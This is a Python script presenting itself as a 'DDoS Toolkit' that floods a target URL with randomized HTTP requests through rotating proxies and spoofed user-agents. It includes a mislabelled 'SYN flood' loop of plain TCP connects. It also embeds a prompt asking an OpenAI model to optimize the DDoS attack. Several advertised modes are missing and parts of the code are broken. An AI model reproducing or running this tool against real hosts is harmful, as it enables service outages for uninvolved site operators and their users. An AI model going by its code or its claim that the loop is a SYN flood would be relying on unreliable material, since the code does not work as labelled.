#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: LIONMAD

# Standard Libraries
import aiohttp  # Asynchronous HTTP requests and responses
import asyncio  # Asynchronous programming and concurrency
import time  # Time-related functions (e.g., delays, timestamps)
import argparse  # Command-line argument parsing
import threading  # Multi-threading support
from concurrent.futures import ThreadPoolExecutor, as_completed  # Thread/process pools for parallel execution
import random  # Random number generation and selections
import json  # JSON serialization and deserialization
from itertools import cycle  # Cycles through an iterable indefinitely
from collections import deque  # Double-ended queue for fast appends/pops
from uuid import uuid4  # Generates unique identifiers (UUIDs)
from base64 import b64encode  # Encodes binary data into base64 ASCII strings
import hashlib  # Hashing algorithms like SHA and MD5
import zlib  # Compression and decompression functions
import hmac  # HMAC (keyed-hash message authentication)
import signal  # Handles asynchronous events and signals
import sys  # System-specific parameters and functions
import os  # Operating system interactions
import subprocess  # Running and managing subprocesses
import socket  # Networking interfaces for communication
import struct  # Packing/unpacking binary data
import logging  # Logging for debugging and system events
import psutil  # Access to system and process utilities (CPU, memory, etc.)

# Third-Party Libraries
import scapy.all as scapy  # Network packet crafting, sending, and analysis
import dns.resolver  # DNS queries and resolution (from dnspython)
from colorama import init, Fore, Style  # Terminal text formatting with colors
from tqdm import tqdm  # Progress bar display for loops
import openai  # Interacting with OpenAI APIs (e.g., ChatGPT, DALL-E)

# Initialize colorama for colorized terminal output
init(autoreset=True)
# Colors
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
BLUE = Fore.BLUE
RESET = Style.RESET_ALL

# Global variables
requests_sent = 0
successful_requests = 0
failed_requests = 0
last_time = time.time()
requests_lock = threading.Lock()
rps_history = deque(maxlen=60)

# Rich User-Agent list
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
]

HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]

# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('load_test.log'),
        logging.StreamHandler()
    ]
)

# Function to display the banner
def display_banner():
    print(f"""
{BLUE}
╔══════════════════════════════════════════════════════════╗
║                   DDoS Toolkit v1.4                      ║
║                   Coded By LIONBAD                       ║
╠══════════════════════════════════════════════════════════╣
║    ⚠ The author is not responsible for any misuse. ⚠     ║
║            ⚠  Use it at your own risk.. ⚠                ║
╚══════════════════════════════════════════════════════════╝
{RESET}
""")

def parse_args():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(description="DDoS Toolkit v1.3 Coded By LIONBAD")
    parser.add_argument("-u", "--url", required=True, help="Target URL or IP address")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
    parser.add_argument("-p", "--pause", type=float, default=0.1, help="Pause time between requests")
    parser.add_argument("-d", "--duration", type=int, default=1500, help="Test duration (seconds)")
    parser.add_argument("--proxies", help="File containing proxy list")
    parser.add_argument("--headers", help="Custom headers as JSON string")
    parser.add_argument("--payload", choices=["json", "xml", "form"], default="json", help="Payload type")
    parser.add_argument("--results", help="File to save results (JSON)")
    parser.add_argument("--rate-limit", type=int, default=100, help="Rate limit for requests per second")
    parser.add_argument("--attack-mode", choices=["http-flood", "slowloris", "udp-flood", "syn-flood"], default="http-flood", help="Type of attack to perform")
    parser.add_argument("--proxy-auth", help="Proxy authentication (username:password)")
    parser.add_argument("--retry", type=int, default=3, help="Number of retries for failed requests")
    parser.add_argument("--user-agents", help="File containing custom user-agent strings")
    return parser.parse_args()

def load_proxies(proxy_file: str):
    """Load proxies from a file."""
    try:
        with open(proxy_file, "r") as f:
            proxy_list = f.read().splitlines()
        valid_proxies = [p.strip() for p in proxy_list if p.strip()]
        print(f"Loaded {len(valid_proxies)} proxies.")
        return valid_proxies
    except FileNotFoundError:
        print(f"Proxy file '{proxy_file}' not found.")
        return []

def validate_proxies(proxies):
    """Validate proxies."""
    validated_proxies = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        future_to_proxy = {executor.submit(check_proxy, proxy): proxy for proxy in proxies}
        for future in as_completed(future_to_proxy):
            proxy = future_to_proxy[future]
            try:
                if future.result():
                    validated_proxies.append(proxy)
            except Exception as e:
                logging.error(f"Proxy validation failed for {proxy}: {e}")
    print(f"Validated {len(validated_proxies)} proxies.")
    return validated_proxies

async def check_proxy(proxy: str):
    """Check if a proxy is valid."""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("https://httpbin.org/ip", proxy=proxy, timeout=3) as response:
                return response.status == 200
    except Exception:
        return False

def generate_payload(payload_type: str):
    """Generate a payload for HTTP requests."""
    payload_id = str(uuid4())
    if payload_type == "json":
        return json.dumps({"id": payload_id, "data": b64encode(os.urandom(64)).decode()})
    elif payload_type == "xml":
        return f"<data><id>{payload_id}</id><value>{b64encode(os.urandom(64)).decode()}</value></data>"
    elif payload_type == "form":
        return {"id": payload_id, "data": b64encode(os.urandom(64)).decode()}
    else:
        return None

async def resolve_target(target_url: str):
    """Resolve the target URL to an IP address."""
    try:
        domain_or_ip = target_url.split("//")[-1].split("/")[0]
        if is_valid_ip(domain_or_ip):
            print(f"Target is an IP address: {domain_or_ip}")
            return domain_or_ip
        # Use dnspython to resolve the domain to an IP
        resolver = dns.resolver.Resolver()
        ip = resolver.resolve(domain_or_ip, "A")[0].to_text()
        print(f"Resolved {domain_or_ip} to IP: {ip}")
        return ip
    except Exception as e:
        logging.error(f"Failed to resolve domain: {e}")
        return None

def is_valid_ip(ip: str):
    """Check if the given string is a valid IP address."""
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

async def rate_limited_attack(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, payload_type="json", retry=3):
    """Perform a rate-limited attack."""
    global requests_sent, successful_requests, failed_requests, last_time
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                for attempt in range(retry):
                    try:
                        headers = headers or {"User-Agent": random.choice(USER_AGENTS)}
                        method = random.choice(HTTP_METHODS)
                        payload = generate_payload(payload_type) if method in ["POST", "PUT", "PATCH"] else None

                        proxy = next(proxy_pool) if proxy_pool else None
                        async with session.request(
                            method, target_url, headers=headers, proxy=proxy, data=payload
                        ) as response:
                            with requests_lock:
                                requests_sent += 1
                                if response.status in [200, 201, 204]:
                                    successful_requests += 1
                                else:
                                    failed_requests += 1
                        break  # Exit retry loop if request succeeds
                    except aiohttp.ClientError as e:
                        with requests_lock:
                            failed_requests += 1
                        logging.error(f"Client error during request (attempt {attempt + 1}): {e}")
                    except Exception as e:
                        with requests_lock:
                            failed_requests += 1
                        logging.error(f"Unexpected error during request (attempt {attempt + 1}): {e}")
                await asyncio.sleep(pause_time)

def syn_flood(target_ip, target_port, duration):
    """Perform a SYN flood attack."""
    print(f"Starting SYN flood attack on {target_ip}:{target_port} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendall(b"SYN")
            s.close()
        except Exception as e:
            print(f"Error during SYN flood: {e}")
        time.sleep(0.01)  # Adjust the sleep time to control the attack rate
    print("SYN flood attack completed.")

def display_status(stop_event: threading.Event, duration: int, results_file=None):
    """Display the status of the load test."""
    start_time = time.time()
    results = []
    with tqdm(total=duration, desc="Progress") as pbar:
        while not stop_event.is_set():
            elapsed = time.time() - start_time
            if elapsed >= duration:
                break
            with requests_lock:
                current_time = time.time()
                rps = requests_sent / max(1, current_time - start_time)
                rps_history.append(rps)
                stats = {
                    "Time": elapsed,
                    "Requests Sent": requests_sent,
                    "Successful Requests": successful_requests,
                    "Failed Requests": failed_requests,
                    "RPS": rps,
                }
                results.append(stats)
                print(f"{GREEN}Requests Sent: {requests_sent} | Successful: {successful_requests} | Failed: {failed_requests} | RPS: {rps:.2f}{RESET}")
            pbar.update(1)
            time.sleep(1)

    if results_file:
        with open(results_file, "w") as f:
            json.dump(results, f, indent=4)
        print(f"Results saved to {results_file}")

def calculate_rps_stats():
    """Calculate RPS statistics."""
    if not rps_history:
        return {"min": 0, "max": 0, "avg": 0}
    return {
        "min": min(rps_history),
        "max": max(rps_history),
        "avg": sum(rps_history) / len(rps_history),
    }

def signal_handler(sig, frame):
    """Handle interrupt signals."""
    print(f"{RED}\nInterrupted by user. Exiting gracefully...{RESET}")
    sys.exit(0)

def get_ai_suggestion():
    """Get AI-powered suggestions for optimizing the attack using OpenAI's GPT model."""
    try:
        # Set your OpenAI API key here
        openai.api_key = "your_openai_api_key_here"

        # Create a prompt for the AI model
        prompt = """
        You are a cybersecurity expert. Provide suggestions to optimize a DDoS attack based on the following parameters:
        - Number of threads: {}
        - Pause time between requests: {}
        - Duration: {}
        - Attack mode: {}
        - Rate limit: {}
        - Proxies used: {}
        - Payload type: {}
        Provide actionable suggestions to improve the effectiveness of the attack.
        """.format(args.threads, args.pause, args.duration, args.attack_mode, args.rate_limit, len(proxies) if proxies else 0, args.payload)

        # Call the OpenAI API to get a suggestion
        response = openai.Completion.create(
            engine="text-davinci-003",  # Use the GPT-3.5 model
            prompt=prompt,
            max_tokens=150,  # Limit the response length
            n=1,  # Number of suggestions to generate
            stop=None,  # No specific stop sequence
            temperature=0.7,  # Controls randomness (0 = deterministic, 1 = random)
        )

        # Extract the suggestion from the response
        suggestion = response.choices[0].text.strip()
        return suggestion

    except Exception as e:
        logging.error(f"Failed to get AI suggestion: {e}")
        return "Unable to fetch AI suggestion. Please check your OpenAI API key and network connection."

def execute_custom_command():
    """Execute a custom command with AI-powered suggestions."""
    suggestion = get_ai_suggestion()
    print(f"{YELLOW}AI-Powered Suggestion: {suggestion}{RESET}")
    # Here you can add logic to execute the suggestion or modify the attack parameters
    # For example, you could adjust the number of threads, pause time, or attack mode based on the suggestion.

async def main():
    """Main function to run the load test."""
    args = parse_args()

    if args.threads <= 0 or args.pause <= 0 or args.duration <= 0 or args.rate_limit <= 0:
        print(f"{RED}Error: Invalid argument values. Ensure all values are positive.{RESET}")
        exit(1)

    display_banner()

    proxies = load_proxies(args.proxies) if args.proxies else []
    if proxies:
        proxies = validate_proxies(proxies)

    headers = json.loads(args.headers) if args.headers else None

    target = args.url.split("//")[-1].split("/")[0]

    if not await resolve_target(target):
        print(f"{RED}Exiting: Target is not reachable.{RESET}")
        exit(1)

    stop_event = threading.Event()
    tasks = []

    if args.attack_mode == "syn-flood":
        target_ip = await resolve_target(target)
        target_port = 80  # Default port for SYN flood
        syn_flood(target_ip, target_port, args.duration)
    else:
        for _ in range(args.threads):
            task = asyncio.create_task(rate_limited_attack(args.url, stop_event, args.pause, args.rate_limit, proxies, headers, args.payload, args.retry))
            tasks.append(task)

    display_thread = threading.Thread(
        target=display_status, args=(stop_event, args.duration, args.results)
    )
    display_thread.daemon = True
    display_thread.start()

    signal.signal(signal.SIGINT, signal_handler)

    try:
        await asyncio.sleep(args.duration)
    except KeyboardInterrupt:
        print(f"{RED}Interrupted by user.{RESET}")
    finally:
        stop_event.set()
        await asyncio.gather(*tasks)

    with requests_lock:
        rps_stats = calculate_rps_stats()
        print(f"{GREEN}Test completed. Requests Sent: {requests_sent} | Successful: {successful_requests} | Failed: {failed_requests} | Final RPS: {rps_stats['avg']:.2f}{RESET}")

    # Execute custom command with AI-powered suggestions
    execute_custom_command()

if __name__ == "__main__":
    asyncio.run(main())
